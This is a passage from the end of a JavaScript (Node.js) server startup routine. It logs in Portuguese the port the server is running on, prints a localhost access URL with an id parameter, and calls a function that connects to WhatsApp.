  console.log(`Servidor rodando na porta ${PORT}`);
  console.log(`Acesse: http://localhost:${PORT}/?id=KFTKWNQVMD`);
  connectToWhatsApp();
});